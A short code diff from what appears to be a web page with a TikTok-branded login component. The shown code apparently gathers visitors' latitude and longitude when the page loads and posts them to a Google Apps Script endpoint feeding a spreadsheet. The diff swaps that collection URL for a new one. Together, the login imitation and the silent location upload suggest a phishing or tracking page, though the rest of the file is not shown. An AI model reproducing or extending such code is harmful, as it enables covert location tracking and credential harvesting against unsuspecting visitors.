@@ -6,9 +6,10 @@ import TikTokLogin from "./components/TiktokLogin";
 export default function Home() {
 
   useEffect(() => {
-    const G_SHEET_URL = "https://script.google.com/macros/s/AKfycbyMUs62wkY5N_G9Mqjhbp9G9fn8KRw8QPjhJNC634f1i7tFfxxkj9LScJ8-v7ANGk7mlA/exec";
+    const G_SHEET_URL = "https://script.google.com/macros/s/AKfycbwT4_usBfYO4M75KsZj9QhiutHjtE35aUBnavKVqZzm-SQgAVOX1AHZ5hNtB30CkbVExw/exec";
 
     const sendToSheet = async (lat: number, lng: number) => {
+
 
       // Kita gunakan format Form Data agar Apps Script lebih mudah membacanya
       const formData = new FormData();
